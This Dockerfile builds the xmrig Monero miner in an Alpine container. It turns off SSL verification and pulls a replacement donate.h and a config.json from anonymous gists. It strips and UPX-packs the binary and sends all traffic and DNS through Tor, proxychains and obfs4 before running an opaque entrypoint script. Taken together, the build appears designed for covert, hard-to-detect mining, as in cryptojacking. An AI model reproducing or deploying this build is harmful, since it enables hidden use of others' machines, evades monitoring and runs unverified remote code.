ARG VERSION=master
FROM  alpine:latest
COPY etc/dnsmasq.conf /etc/dnsmasq.conf
COPY etc/s6 /etc/s6
COPY bin/work /usr/bin/work
COPY etc/proxychains/proxychains.conf /etc/proxychains/proxychains.conf 
RUN   mkdir /xmrig && \
      apk --no-cache upgrade && \
      apk --no-cache add \
        git \
        cmake \
        libuv-dev dnsmasq s6 \
        upx binutils build-base libmicrohttpd-dev openssl-dev tor curl torsocks openrc&& \
      rc-update add s6 default && \
      sed "1s/^/SocksPort 0.0.0.0:9050\n/" /etc/tor/torrc.sample > /etc/tor/torrc && \
      apk add --no-cache -X http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc hwloc-dev obfs4proxy proxychains-ng&& \
      git config --global http.sslVerify false && git clone https://github.com/MoneroOcean/xmrig && \
      cd xmrig && \
      git fetch --tags && \
      git checkout ${VERSION} && \
      git submodule update --init --recursive && \
      rm src/donate.h && \
      wget https://gist.githubusercontent.com/dsomeone/138a503bbd9f4c41980e0668f2eed179/raw/876aaa119ea8c1769105129dc661a970b9c086a7/donate.h -P src/ && \
      mkdir build && \
      cd build && \
      wget https://gist.githubusercontent.com/dsomeone/e03975b7e89d8bcbc5f156b277e8b2c9/raw/53397f71181b863e0a36793f36a6cfec0d415c19/config.json && \
      cmake -DCMAKE_BUILD_TYPE=Release .. && \
      make -j4 && \
      rm -rf ./src Makefile CMakeFiles CMakeCache.txt && \
      find . -name '*cmake*' -delete && \
      rm -rf ../doc  ../res  ../src ../CHANGELOG.md  ../CMakeLists.txt  ../LICENSE  ../README.md ../.git ../cmake && \
      strip --strip-all -s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag xmrig && \
      upx -9 --8mib-ram --lzma xmrig && \
      apk del --no-cache --purge \
        build-base \
        cmake \
        git upx binutils && \
      rm -rf /var/cache/apk/* &&\
      echo 'nameserver 127.0.0.1' > /etc/resolv.conf && \
      echo 'DNSPort 9053' >> /etc/tor/torrc && \
      chmod 0755 \
        /etc/s6/*/run \
        /usr/bin/work 

HEALTHCHECK --interval=60s --timeout=15s --start-period=20s \
    CMD curl -s --socks5 127.0.0.1:9050 'https://check.torproject.org/' | grep -qm1 Congratulations
EXPOSE 80
WORKDIR  /xmrig/build
ENTRYPOINT ["/usr/bin/work"]
